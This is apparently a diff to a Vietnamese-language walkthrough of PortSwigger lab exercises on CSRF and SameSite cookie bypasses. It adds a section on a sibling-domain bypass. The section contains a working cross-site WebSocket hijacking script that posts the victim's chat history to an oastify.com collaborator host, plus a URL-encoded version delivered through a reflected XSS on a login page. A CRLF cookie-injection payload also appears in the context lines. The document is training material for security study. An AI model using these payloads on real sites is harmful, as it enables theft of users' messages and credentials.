@@ -294,6 +294,8 @@ a%0d%0aSet-Cookie%3A%20csrfKey%3D9jO1393d6TRWSKVyHHw3jXgiH75dH3nd%3B%20SameSite%
 chúng ta cần thêm `SameSite=None` vì site của exploit-server khác với trang web của bài lab.
 mình encode url rồi cộng thêm phần cần search ở phía trước
 
+![image](https://hackmd.io/_uploads/rkTKFm-dyl.png)
+
 ![image](https://hackmd.io/_uploads/rkAZy1H5p.png)
 
 ta đã set cookie csrfKey thành công theo ý muốn (ở đây là csrfKey của user wiener ở trên)
@@ -667,3 +669,73 @@ Thêm đoạn script trên vào và send exploit đến nạn nhân.
 và mình đã giải quyết được lab này
 
 ![image](https://hackmd.io/_uploads/H1TG2AScp.png)
+
+## Lab: SameSite Strict bypass via sibling domain
+
+link: https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain
+
+### Đề bài
+
+![image](https://hackmd.io/_uploads/SyzO2TWu1e.png)
+
+### Phân tích
+
+- Trong Burp, hãy vào tab `Proxy > WebSockets history` . Lưu ý rằng khi bạn làm mới trang, trình duyệt sẽ gửi READYtin nhắn đến máy chủ. Điều này khiến máy chủ phản hồi với toàn bộ lịch sử trò chuyện.
+
+- mà chat ko có csrf token gì nên có thể khai thác csrf
+
+### Khai thác
+
+- tự khai thác mình trước với payload
+
+```javascript!
+<script>
+    var ws = new WebSocket('wss://0ad1002103f1da5a811af7c00035002d.web-security-academy.net/chat');
+    ws.onopen = function() {
+        ws.send("READY");
+    };
+    ws.onmessage = function(event) {
+        fetch('https://m0n0p7ag93p1fko1ar2xofvm5db4zvnk.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
+    };
+</script>
+```
+
+![image](https://hackmd.io/_uploads/SyU9P6Z_Je.png)
+
+- thấy bắt đc phản hồi trả về
+
+![image](https://hackmd.io/_uploads/Hk2dwp-OJx.png)
+
+- nhưng vì SameSite là Strict nên ko thể thực hiện do ngăn gửi kèm cookie ==> kết nối mặc định
+
+![image](https://hackmd.io/_uploads/ryLEppZ_Jg.png)
+
+- để ý có endponit chat.js và file này đc lấy từ 1 domain khác được cho phép chia sẻ cookie
+
+![image](https://hackmd.io/_uploads/rJPZ2T-dyl.png)
+
+![image](https://hackmd.io/_uploads/ryN-R6Z_yg.png)
+
+- vào nó bắt đăng nhập và trang đăng nhập bị xss
+
+![image](https://hackmd.io/_uploads/Bkd0op-dkx.png)
+
+![image](https://hackmd.io/_uploads/SyTQiaW_1e.png)
+
+==> để bypass samesite strict chúng ta cần tận dụng endpoint này
+
+![image](https://hackmd.io/_uploads/ryNriTbd1g.png)
+
+```javascript!
+<script>
+    document.location = "https://cms-0ad1002103f1da5a811af7c00035002d.web-security-academy.net/login?username=%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%64%31%30%30%32%31%30%33%66%31%64%61%35%61%38%31%31%61%66%37%63%30%30%30%33%35%30%30%32%64%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%7d%3b%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%20%20%20%20%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%34%73%78%69%68%70%32%79%31%6c%68%6a%37%32%67%6a%32%39%75%66%67%78%6e%34%78%76%33%6d%72%68%66%36%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%27%2c%20%7b%6d%65%74%68%6f%64%3a%20%27%50%4f%53%54%27%2c%20%6d%6f%64%65%3a%20%27%6e%6f%2d%63%6f%72%73%27%2c%20%62%6f%64%79%3a%20%65%76%65%6e%74%2e%64%61%74%61%7d%29%3b%0a%20%20%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e&password=anything";
+</script>
+```
+
+![image](https://hackmd.io/_uploads/H19556Wdye.png)
+
+- lấy mật khẩu đăng nhập và solve lab
+
+![image](https://hackmd.io/_uploads/HyRAq6-_kl.png)
+
+<img  src="https://3198551054-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FVvHHLY2mrxd5y4e2vVYL%2Fuploads%2FF8DJirSFlv1Un7WBmtvu%2Fcomplete.gif?alt=media&token=045fd197-4004-49f4-a8ed-ee28e197008f">
